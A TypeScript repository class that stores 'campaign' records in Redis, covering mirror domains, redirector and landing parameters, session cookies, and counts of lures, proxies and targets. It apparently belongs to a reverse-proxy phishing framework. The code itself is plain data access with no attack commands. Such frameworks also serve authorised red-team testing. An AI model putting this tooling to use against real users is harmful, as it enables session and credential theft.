import { DIContainer, randomLockCode } from '@famir/common'
import {
  CAMPAIGN_REPOSITORY,
  CampaignModel,
  CampaignRepository,
  Config,
  CONFIG,
  DATABASE_CONNECTOR,
  DatabaseConnector,
  FullCampaignModel,
  Logger,
  LOGGER,
  testCampaignModel,
  Validator,
  VALIDATOR
} from '@famir/domain'
import { RedisDatabaseConfig } from '../../database.js'
import { RedisDatabaseConnection } from '../../redis-database-connector.js'
import { RedisBaseRepository } from '../base/index.js'
import { RawCampaign, RawFullCampaign } from './campaign.functions.js'
import { campaignSchemas } from './campaign.schemas.js'

export class RedisCampaignRepository extends RedisBaseRepository implements CampaignRepository {
  static inject(container: DIContainer) {
    container.registerSingleton<CampaignRepository>(
      CAMPAIGN_REPOSITORY,
      (c) =>
        new RedisCampaignRepository(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Config<RedisDatabaseConfig>>(CONFIG),
          c.resolve<Logger>(LOGGER),
          c.resolve<DatabaseConnector>(DATABASE_CONNECTOR).connection<RedisDatabaseConnection>()
        )
    )
  }

  constructor(
    validator: Validator,
    config: Config<RedisDatabaseConfig>,
    logger: Logger,
    connection: RedisDatabaseConnection
  ) {
    super(validator, config, logger, connection, 'campaign')

    this.validator.addSchemas(campaignSchemas)

    this.logger.debug(`CampaignRepository initialized`)
  }

  async create(
    campaignId: string,
    mirrorDomain: string,
    description: string,
    landingUpgradePath: string,
    landingUpgradeParam: string,
    landingRedirectorParam: string,
    sessionCookieName: string,
    sessionExpire: number,
    newSessionExpire: number,
    messageExpire: number
  ): Promise<number> {
    const lockCode = randomLockCode()

    try {
      const statusReply = await this.connection.campaign.create_campaign(
        this.options.prefix,
        campaignId,
        mirrorDomain,
        description,
        landingUpgradePath,
        landingUpgradeParam,
        landingRedirectorParam,
        sessionCookieName,
        sessionExpire,
        newSessionExpire,
        messageExpire,
        lockCode
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId, mirrorDomain } })

      return lockCode
    } catch (error) {
      this.raiseError(error, 'create', { campaignId, mirrorDomain })
    }
  }

  async read(campaignId: string): Promise<FullCampaignModel | null> {
    try {
      const rawFullModel = await this.connection.campaign.read_full_campaign(
        this.options.prefix,
        campaignId
      )

      return this.buildFullModel(rawFullModel)
    } catch (error) {
      this.raiseError(error, 'read', { campaignId })
    }
  }

  async lock(campaignId: string, isForce: boolean): Promise<number> {
    const lockCode = randomLockCode()

    try {
      const statusReply = await this.connection.campaign.lock_campaign(
        this.options.prefix,
        campaignId,
        lockCode,
        isForce
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })

      return lockCode
    } catch (error) {
      this.raiseError(error, 'lock', { campaignId })
    }
  }

  async unlock(campaignId: string, lockCode: number): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.unlock_campaign(
        this.options.prefix,
        campaignId,
        lockCode
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })
    } catch (error) {
      this.raiseError(error, 'unlock', { campaignId })
    }
  }

  async update(
    campaignId: string,
    description: string | null | undefined,
    sessionExpire: number | null | undefined,
    newSessionExpire: number | null | undefined,
    messageExpire: number | null | undefined,
    lockCode: number
  ): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.update_campaign(
        this.options.prefix,
        campaignId,
        description,
        sessionExpire,
        newSessionExpire,
        messageExpire,
        lockCode
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })
    } catch (error) {
      this.raiseError(error, 'update', { campaignId })
    }
  }

  async delete(campaignId: string, lockCode: number): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.delete_campaign(
        this.options.prefix,
        campaignId,
        lockCode
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })
    } catch (error) {
      this.raiseError(error, 'delete', { campaignId })
    }
  }

  async list(): Promise<CampaignModel[]> {
    try {
      const index = await this.connection.campaign.read_campaign_index(this.options.prefix)

      this.validateArrayStringsReply(index)

      const rawCollection = await Promise.all(
        index.map((campaignId) =>
          this.connection.campaign.read_campaign(this.options.prefix, campaignId)
        )
      )

      return this.buildCollection(rawCollection)
    } catch (error) {
      this.raiseError(error, 'list', null)
    }
  }

  protected buildModel(rawModel: unknown): CampaignModel | null {
    if (rawModel === null) {
      return null
    }

    this.validateRawData<RawCampaign>('database-raw-campaign', rawModel)

    return {
      campaignId: rawModel.campaign_id,
      mirrorDomain: rawModel.mirror_domain,
      sessionCount: rawModel.session_count,
      messageCount: rawModel.message_count,
      isLocked: !!rawModel.lock_code,
      createdAt: new Date(rawModel.created_at),
      updatedAt: new Date(rawModel.updated_at)
    }
  }

  protected buildFullModel(rawFullModel: unknown): FullCampaignModel | null {
    if (rawFullModel === null) {
      return null
    }

    this.validateRawData<RawFullCampaign>('database-raw-full-campaign', rawFullModel)

    return {
      campaignId: rawFullModel.campaign_id,
      mirrorDomain: rawFullModel.mirror_domain,
      description: rawFullModel.description,
      landingUpgradePath: rawFullModel.landing_upgrade_path,
      landingUpgradeParam: rawFullModel.landing_upgrade_param,
      landingRedirectorParam: rawFullModel.landing_redirector_param,
      sessionCookieName: rawFullModel.session_cookie_name,
      sessionExpire: rawFullModel.session_expire,
      newSessionExpire: rawFullModel.new_session_expire,
      messageExpire: rawFullModel.message_expire,
      proxyCount: rawFullModel.proxy_count,
      targetCount: rawFullModel.target_count,
      redirectorCount: rawFullModel.redirector_count,
      lureCount: rawFullModel.lure_count,
      sessionCount: rawFullModel.session_count,
      messageCount: rawFullModel.message_count,
      isLocked: !!rawFullModel.lock_code,
      createdAt: new Date(rawFullModel.created_at),
      updatedAt: new Date(rawFullModel.updated_at)
    }
  }

  protected buildCollection(rawCollection: unknown): CampaignModel[] {
    this.validateArrayReply(rawCollection)

    return rawCollection.map((rawModel) => this.buildModel(rawModel)).filter(testCampaignModel)
  }
}
